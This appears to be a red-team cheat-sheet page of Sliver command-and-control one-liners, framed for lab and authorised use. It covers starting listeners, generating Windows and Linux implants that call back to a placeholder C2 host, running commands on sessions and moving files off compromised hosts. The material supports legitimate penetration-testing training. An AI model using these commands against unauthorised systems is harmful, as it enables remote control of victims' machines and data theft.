---
hide:
  - toc
---
# Sliver C2

<span class="ol-search-aliases">sliver c2 command control beacon session multiplayer mtls http listener</span>

Compact Sliver operator one-liners for lab and authorised red team use.

<div class="ol-section-kicker"><span>RT</span><strong>SLIVER</strong></div>

## Start Sliver server
```bash
sliver-server
```
**Tool:** Sliver · **Platform:** Linux · **Tags:** C2, Server · **Context:** Operator · **Noise:** Loud

## Launch Sliver client
```bash
sliver-client
```
**Tool:** Sliver · **Platform:** Linux/macOS/Windows · **Tags:** C2, Client · **Context:** Operator · **Noise:** Loud

## HTTP listener
```text
http --lhost <LHOST> --lport <LPORT>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** HTTP, Listener · **Context:** Operator · **Noise:** Loud

## HTTPS listener
```text
https --lhost <LHOST> --lport <LPORT>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** HTTPS, Listener · **Context:** Operator · **Noise:** Loud

## mTLS listener
```text
mtls --lhost <LHOST> --lport <LPORT>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** mTLS, Listener · **Context:** Operator · **Noise:** Loud

## Generate Windows implant
```text
generate --os windows --arch amd64 --mtls <C2_HOST>:<LPORT> --save <OUTPUT_DIR>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** Implant, Windows · **Context:** Operator · **Noise:** Loud

## Generate Linux implant
```text
generate --os linux --arch amd64 --mtls <C2_HOST>:<LPORT> --save <OUTPUT_DIR>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** Implant, Linux · **Context:** Operator · **Noise:** Loud

## List sessions
```text
sessions
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** Sessions · **Context:** Operator · **Noise:** Loud

## Select a session
```text
use <SESSION_ID>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** Sessions · **Context:** Operator · **Noise:** Loud

## Host process info
```text
info
```
**Tool:** Sliver · **Platform:** Sliver session · **Tags:** Host, Context · **Context:** Session · **Noise:** Loud

## Run command in session
```text
execute -o whoami /all
```
**Tool:** Sliver · **Platform:** Sliver session · **Tags:** Execution, Enumeration · **Context:** Session · **Noise:** Loud

## Upload a file
```text
upload <LOCAL_FILE> <REMOTE_PATH>
```
**Tool:** Sliver · **Platform:** Sliver session · **Tags:** File Transfer · **Context:** Session · **Noise:** Loud

## Download a file
```text
download <REMOTE_FILE> <LOCAL_PATH>
```
**Tool:** Sliver · **Platform:** Sliver session · **Tags:** File Transfer · **Context:** Session · **Noise:** Loud

**Related:** [Execution](execution.md) · [Staging & File Transfer](staging-file-transfer.md) · [Tunneling](tunneling.md)
